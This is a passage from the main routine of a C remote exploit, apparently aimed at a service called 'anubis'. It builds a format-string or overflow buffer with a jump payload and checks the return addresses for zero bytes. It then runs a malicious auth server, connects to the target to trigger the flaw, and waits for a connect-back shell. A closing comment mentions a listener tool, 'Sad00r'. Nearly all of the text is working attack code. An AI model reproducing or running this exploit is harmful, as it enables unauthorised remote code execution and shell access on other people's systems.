        memcpy(&buf[(tgt->offset+24)], JMPCODE, sizeof(JMPCODE)-1);
        buf[tgt->offset+4] = '\n';
    }

    printf("    Target: %s\n", tgt->desc);
    printf("    Return: 0x%08x\n", ret);
    printf("    Retloc: 0x%08x\n", tgt->retloc);
    if (tgt->type == FMTSTR) {
        printf("    offset: %u bytes%s\n", tgt->offset,
            tgt->offset==1?"s":"");
        printf("   Padding: %u byte%s\n", tgt->pad,
            tgt->pad==1?"s":"");
        printf("   Written: %u byte%s\n", tgt->written,
            tgt->written==1?"s":"");
    }
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n");

    if (!(ret & 0xff000000) ||
        !(ret & 0x00ff0000) ||
        !(ret & 0x0000ff00) ||
        !(ret & 0x000000ff)) {

        fprintf(stderr, "** Zero byte(s) in return address\n");
        exit(EXIT_FAILURE);
    }

    if (!(tgt->retloc & 0xff000000) ||
        !(tgt->retloc & 0x00ff0000) ||
        !(tgt->retloc & 0x0000ff00) ||
        !(tgt->retloc & 0x000000ff)) {

        fprintf(stderr, "** Zero byte(s) in retloc\n");
        exit(EXIT_FAILURE);
    }

    signal(SIGUSR1, signal_handler);

    if ( (pid1 = fork()) < 0) {
        perror("** fork()");
        exit(EXIT_FAILURE);
    }

    /* Auth server */
    if (pid1 == 0) {
        kill(getppid(), SIGUSR1);
        signal(SIGUSR1, signal_handler);
        while (!start_auth);
        if (evil_auth(auth_port, buf, strlen(buf)) != 0)
            kill(getppid(), SIGTERM);
            exit(EXIT_SUCCESS);
    }

    if ( (pid2 = fork()) < 0) {
        perror("** fork()");
        kill(pid1, SIGTERM);
        exit(EXIT_FAILURE);
    }

    /* Connect to trigger */
    if (pid2 == 0) {
        int anubis_sock;

        signal(SIGUSR1, signal_handler);
        while (!connect_target);
        if ( (anubis_sock = sock_connect(taddr.sin_addr.s_addr,
                taddr.sin_port)) < 0) {
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }

    /* Start auth */
    while(!start_auth);
    kill(pid1, SIGUSR1);

    if (get_connectback(pid2, lsock) < 0) {
        kill(0, SIGTERM);
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}

/*
Sad00r provides a more command-line like approach to listening. It gives a menu for input instead of requiring it before compilation.
*/
